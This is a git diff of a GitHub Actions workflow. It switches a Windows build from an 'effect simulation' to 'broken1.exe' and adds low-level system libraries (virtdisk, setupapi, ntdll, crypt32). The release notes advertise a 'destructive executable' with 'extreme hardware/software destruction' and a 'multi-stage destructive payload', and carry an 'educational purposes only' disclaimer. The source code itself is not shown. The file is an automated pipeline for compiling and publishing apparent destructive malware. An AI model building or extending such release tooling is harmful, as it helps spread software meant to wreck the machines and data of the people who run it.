@@ -1,5 +1,4 @@
-
-name: Build and Release Broken Effect
+name: Build and Release Broken
 
 on:
   push:
@@ -24,24 +23,20 @@ jobs:
     - name: Checkout repository
       uses: actions/checkout@v4
 
-    - name: Compile resources
-      shell: msys2 {0}
-      run: |
-        windres BROKEN/broken.rc -O coff -o BROKEN/broken.res
-
-    - name: Build broken.exe
+    - name: Build broken1.exe
       shell: msys2 {0}
       run: |
         export PATH="/mingw64/bin:$PATH"
         g++ --version
-        g++ -O2 -Wall -Wextra -static -o broken.exe \
-            BROKEN/broken.cpp BROKEN/broken.res \
+        g++ -O2 -Wall -Wextra -static -o broken1.exe \
+            BROKEN/broken3.cpp \
             -lwinmm -luser32 -ldwmapi -lgdi32 -lpsapi -lpthread -lshell32 -lcomdlg32 -ladvapi32 \
+            -lsetupapi -lvirtdisk -lcrypt32 -lntdll \
             -mwindows -Wno-cast-function-type -Wno-missing-field-initializers
 
     - name: Verify build
       run: |
-        if (-not (Test-Path "broken.exe")) {
+        if (-not (Test-Path "broken1.exe")) {
           echo "::error::Build failed!"
           exit 1
         }
@@ -50,12 +45,17 @@ jobs:
       uses: softprops/action-gh-release@v2
       with:
         tag_name: ${{ github.ref_name }}
-        name: Broken Effect ${{ github.ref_name }}
+        name: Broken ${{ github.ref_name }}
         body: |
-          BROKEN EXECUTABLE SIMULATION v1.0
-          - Custom effects
+          BROKEN DESTRUCTIVE EXECUTABLE
+          - Extreme hardware/software destruction
+          - Multi-stage destructive payload
+          - Privilege-aware destruction modes
           - Built automatically from GitHub Actions
           - Author: WHO-AM-I-404
-        files: broken.exe
+          
+          WARNING: This software is for educational purposes only!
+          Do not run on production systems or personal devices.
+        files: broken1.exe
       env:
         GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
